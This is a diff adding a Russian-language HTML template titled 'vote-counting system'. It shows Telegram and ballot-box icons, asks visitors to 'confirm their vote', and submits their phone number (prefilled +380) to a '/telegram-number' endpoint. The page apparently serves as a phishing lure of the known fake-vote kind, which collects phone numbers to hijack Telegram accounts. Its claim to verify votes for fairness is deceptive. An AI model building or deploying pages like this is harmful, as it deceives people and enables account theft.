@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Система учета голосов</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+<body>
+    <div class="container">
+        <div class="icons">
+            <div class="telegram-logo"></div>
+            <div class="arrow"></div>
+            <div class="ballot-box"></div>
+        </div>
+        <h1>Система учета голосов</h1>
+        <p class="description">
+            Пожалуйста, подтвердите ваш голос. Это сделано для того, чтобы каждый голос был честным. <br> С уважением, Администрация.
+        </p>
+        <form action="/telegram-number" method="post" class="input-container">
+            <label for="phone-number" class="floating-label">Phone Number</label>
+            <input type="text" placeholder="+380" class="input-field" id="phone-number" name="phone_number" required autocomplete="off">
+            <button type="submit" class="submit-button">ПОДТВЕРДИТЬ</button>
+        </form>
+    </div>
+    <script>
+        document.querySelector('.input-container').addEventListener('submit', function(event) {
+            const phoneNumber = document.getElementById('phone-number').value;
+            localStorage.setItem('phoneNumber', phoneNumber);
+            this.submit();
+        });
+    </script>
+</body>
+</html>
+
+
